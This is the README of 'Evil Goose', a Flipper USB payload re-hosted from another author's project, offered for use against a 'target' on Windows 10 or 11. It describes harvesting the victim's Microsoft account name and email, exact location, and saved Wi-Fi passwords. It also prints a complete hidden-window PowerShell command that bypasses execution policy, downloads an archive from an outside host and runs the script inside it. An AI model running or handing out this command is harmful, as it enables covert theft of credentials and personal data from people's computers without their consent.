# Evil Goose

**A payload that hires a goose to hack your target in real time.**

---

## Description

With this payload, once executed, it will wait for a mouse movement to begin. Afterward, it will walk around your target's screen, pulling out personal information such as:

- **Full name** associated with their Microsoft account
- **Email address** associated with their Microsoft account
- **Exact geo-location**
- **Wi-Fi networks and passwords**

---

## Getting Started

### Dependencies

- **Windows 10** or **11**

---

### Executing the Program

1. Plug in your device.
2. After 10 seconds, the goose will begin its work on your target's system.

To execute, run the following PowerShell command:

```powershell
powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'https://jakoby.lol/1ae' -O "$D\hg.zip";Expand-Archive "$D\hg.zip" -Des $D -Force;. "$D\hg\main.ps1"
```

---

## Exiting the Payload

- This payload will automatically end after **2 minutes**.
- Alternatively, you can manually exit by pressing **Left Control + Right Control** at the same time.

---

## Disclaimer

This is a Flipper script from Jakoby’s **"Evil Goose"** project. Jakoby’s website is currently down, and his scripts rely on pulling files from it. To ensure you can still use the script, I’ve hosted the necessary files on my site. I'm sharing this here to keep the project accessible while his site is unavailable.

Please note that I'm providing this script for **accessibility purposes** and to keep the project alive during this downtime.

---

## Credits

This project was created by **I am Jakoby**. I am not taking credit for this work. You can find his original work on his GitHub: [I-Am-Jakoby](https://github.com/I-Am-Jakoby).

---

## Contributing

All contributors' names will be listed here.

**I am Jakoby.**

---

## Version History

- **0.1** - Initial Release

---

## Contact

For inquiries or suggestions, feel free to reach out.
